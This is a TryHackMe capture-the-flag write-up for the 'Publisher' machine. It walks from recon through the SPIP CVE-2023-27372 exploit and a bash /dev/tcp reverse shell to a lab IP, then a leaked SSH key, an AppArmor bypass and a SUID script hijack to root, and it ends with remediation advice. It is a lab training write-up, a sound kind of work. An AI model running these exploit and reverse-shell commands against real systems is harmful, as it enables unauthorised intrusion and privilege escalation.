# Publisher — TryHackMe Writeup

**Platform:** TryHackMe | **Difficulty:** Easy | **Target IP:** 10.64.189.14 | **Attacker IP:** 192.168.131.193

## Machine info

![Publisher machine card](images/01-machine-card.png)

## Summary

**Publisher** is a TryHackMe machine running a vulnerable SPIP 4.2.0 content management system on Apache/Ubuntu 20.04. An unauthenticated remote code execution vulnerability in SPIP (CVE-2023-27372) grants a shell inside a Docker container as www-data, where a leaked SSH private key exposed through a shared bind mount pivots access to the host user think. A SUID root binary that executes a user-writable script is protected by a misconfigured AppArmor profile, but relocating a copy of bash to a directory the profile fails to cover bypasses the confinement, allowing the script to be hijacked and executed as root.

**Attack chain:** SPIP 4.2.0 Unauthenticated RCE (CVE-2023-27372) → www-data (Docker container) → Leaked SSH Key → think → AppArmor Bypass & SUID run_container Hijack → Root

## 1. Reconnaissance

```
nmap -p- -sS -sV -sC -vvv -oN scan.txt 10.64.189.14

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:05:dc:5d:74:72:3d:b1:a4:0c:75:1c:4b:19:c4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGJJXXm86OjdOqHtP/Ze3L/8CniyvzNeoCQb262O7kGxi9Ms/xbnvlndRJeeh0DUon5AgaEc7e58m1+XG9O8ztrC7ZhcKMJcpTbOVfEeTUhnClQOhTdait05LpBFlS1s6wi+WAxxEN4cNQSi7F+PFJCXwhCiOhFfQQ2CN6XRQhquov80PppQp6roIr0qG7v0gWxJUK88w3ISQT0hyhu0x4q4gv9hszOBNvgx+ZxYUc7g87yPhaK+81noe5LE6l872PCZigPP5+EUfNfD2tZ6OgB5Gj5evbu1NeiWlg+lqe0tU7MnsBbteUCqLpGruBXbWEeALPoe5i2ce1+CgQxFgZ7QWTCpSbVbjSe7cVBdbfAHCVDGqg1+lFpeWbnwauPQziUENpkSTWt3V2OAxI6IGdQgtnW5EjGTXU2NHvfVoYsrMgfgfuOoQr7EDoEo2YAEt5RMhGzgm+NgR0Sm7dPwGCtZPYHiPzGl33LMqK+hzK6J2HHGM3SXQ1y559k5wfaK8=
|   256 cb:88:c8:cd:b0:30:73:39:e0:53:53:01:e4:14:92:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI4997g9lZ5B5ZYTEXI+Pmf8vbpV4nF8P1pMbG+KVV70U3VtrIIVMdMIWg7uvlnYAKp4JK5WKAZcpvELXq8487U=
|   256 e7:02:7a:21:7f:7c:39:52:e8:89:9c:8d:46:e4:5b:1e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFTBvfOLti8MoCjkeiifL4gTT7OccuRsO9hXkdiTw4yK
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A `gobuster` scan against the webroot revealed two directories:

```
gobuster dir -u http://10.64.189.14/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

images               (Status: 301) [Size: 313] [--> http://10.64.189.14/images/]
spip                 (Status: 301) [Size: 311] [--> http://10.64.189.14/spip/]
```

![Index of /images](images/02-index-of-images.png)

`/spip/` hosted a `SPIP`-powered blog, identifiable by the branding in its footer:

![SPIP blog homepage](images/03-spip-blog-homepage.png)

Its page source confirmed the exact version through the generator meta tag:

```
<meta name="generator" content="SPIP 4.2.0" />
```

Searching `Exploit-DB` for this version turned up a public unauthenticated RCE:

```
searchsploit SPIP 4.2.0

 Exploit Title                                                                                                                                                                                            |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                                                                                                                                     | php/webapps/51536.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

## 2. Unauthenticated RCE via CVE-2023-27372 — Reverse Shell & TTY Stabilization

```
searchsploit -m php/webapps/51536.py
```

The exploit `51536.py` failed out of the box against a modern Python environment with `AttributeError: module 'urllib3.util.ssl_' has no attribute 'DEFAULT_CIPHERS'`. Commenting out line 63 (`requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'`) resolved it, after which the script successfully retrieved `SPIP`'s anti-CSRF token and delivered the payload:

```
python3 51536.py -u http://10.64.189.14/spip/ -c 'bash -c "bash -i >& /dev/tcp/192.168.131.193/4444 0>&1"' -v
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
```

![Reverse shell catch — www-data](images/04-reverse-shell-catch.png)

The shell lacked a TTY and was stabilized before continuing:

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

## 3. Pivoting to think via Leaked SSH Key — User Flag

The shell landed inside a `Docker` container as `www-data`. The `think` home directory was directly accessible from inside the container through a shared bind mount, exposing both `user.txt` and a `.ssh` directory containing a private key:

```
ls -la /home/think

total 48
drwxr-xr-x 8 think    think    4096 Feb 10  2024 .
drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Feb 10  2024 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10  2024 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -> /dev/null
drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
```

```
cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
-----END OPENSSH PRIVATE KEY-----
```

The key was saved locally on the attacker machine and its permissions restricted before use:

```
chmod 600 id_rsa
```

Using this key to authenticate as `think` over `SSH` confirmed access and recovered the user flag:

![SSH login as think](images/05-ssh-login-think.png)

![user.txt flag](images/06-user-flag.png)

## 4. Privilege Escalation via SUID run_container Script Hijack — Root Flag

Searching for SUID binaries turned up an unusual, non-standard one:

```
find / -perm -4000 2>/dev/null

/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

`/usr/sbin/run_container` is a `root`-owned SUID binary that internally executes `/opt/run_container.sh` as `root`. That script is world-writable:

```
#!/bin/bash

list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
                    echo "No enough containers are currently running."
                    exit 1
                fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

list_containers
prompt_container_id
select_action "$container_id"
```

Despite the file's `777` permissions, `think`'s login shell (`/usr/sbin/ash`) is confined by a custom `AppArmor` profile:

```
cat /etc/apparmor.d/usr.sbin.ash

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,
  owner /home/** rix,
}
```

Attempting to list `/opt` confirmed the restriction, returning `ls: cannot open directory '.': Permission denied`, and writing to the script directly was blocked as well:

```
echo "test" >> run_container.sh
-ash: run_container.sh: Permission denied
```

Reading the rules closely shows the deny lines for `/opt`, `/tmp` and `/home` use the recursive `/**` wildcard, while the lines for `/dev/shm` and `/var/tmp` only deny the literal directory path — writing a file *inside* those two is not actually blocked. Relocating a copy of `bash` to `/dev/shm` and executing it from a relative path escapes the confinement entirely:

```
cp /bin/bash .
./bash
```

With the confinement bypassed, `/opt/run_container.sh` could now be overwritten with a payload that copies `bash` to `/var/tmp` and sets the setuid bit — `/var/tmp` was used instead of `/dev/shm`, since that filesystem is mounted `nosuid` and silently strips the setuid bit from anything executed there:

```
echo '#!/bin/bash
cp /bin/bash /var/tmp/bash
chmod u+s /var/tmp/bash' > run_container.sh
```

Triggering the SUID binary executed the payload as `root`, producing a `root`-owned, SUID-set copy of `bash` in `/var/tmp`:

```
/usr/sbin/run_container
```

Invoking that copy with `-p`, which stops `bash` from dropping the elevated privilege on launch, granted a `root` shell:

```
/var/tmp/bash -p
```

![root shell](images/07-root-shell.png)

![root.txt flag](images/08-root-flag.png)

## Root Cause & Remediation

| Issue | Fix |
|---|---|
| `SPIP` 4.2.0 vulnerable to an unauthenticated RCE (CVE-2023-27372) via mishandled serialization of form values | Upgrade to `SPIP` 4.2.1 or later |
| Private `SSH` key in `/home/think` exposed to the `Docker` container via an unrestricted bind mount, enabling pivot to the host user `think` | Avoid bind-mounting sensitive host directories into containers; scope mounts narrowly |
| `/opt/run_container.sh` world-writable, executed by a SUID `root` binary (`run_container`) | Remove the SUID bit, or restrict the script's write permissions to `root` only |
| `AppArmor` profile for `/usr/sbin/ash` uses recursive `/**` for `/opt`, `/tmp` and `/home`, but only the literal path for `/dev/shm` and `/var/tmp`, allowing confinement bypass | Rewrite the deny rules as `/dev/shm/** w` and `/var/tmp/** w` to cover their contents recursively |
